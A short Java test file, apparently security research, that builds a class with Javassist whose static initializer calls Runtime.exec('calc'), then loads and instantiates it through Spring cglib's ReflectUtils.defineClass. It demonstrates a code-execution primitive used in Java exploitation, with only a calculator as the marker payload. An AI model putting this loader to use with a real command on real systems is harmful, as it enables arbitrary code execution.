package com.test;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.springframework.cglib.core.ReflectUtils;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class DefineTest {
    public DefineTest() {

    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.importPackage("java.io");
        CtClass ctClass = pool.makeClass("org.springframework.cglib.core.Calc");
        CtConstructor ctConstructor = ctClass.makeClassInitializer();
        ctConstructor.setBody("try {\n" +
                "            Runtime.getRuntime().exec(\"calc\");\n" +
                "        } catch (IOException e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");
        CtConstructor constructor = new CtConstructor(new CtClass[0], ctClass);
        constructor.setBody("System.out.println(\"constructor\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        // ReflectUtils.defineClass 只会触发static，需要额外newInstance一下
        ReflectUtils.defineClass("org.springframework.cglib.core.Calc", bytes, Thread.currentThread().getContextClassLoader(), null, ReflectUtils.class).newInstance();
    }
}
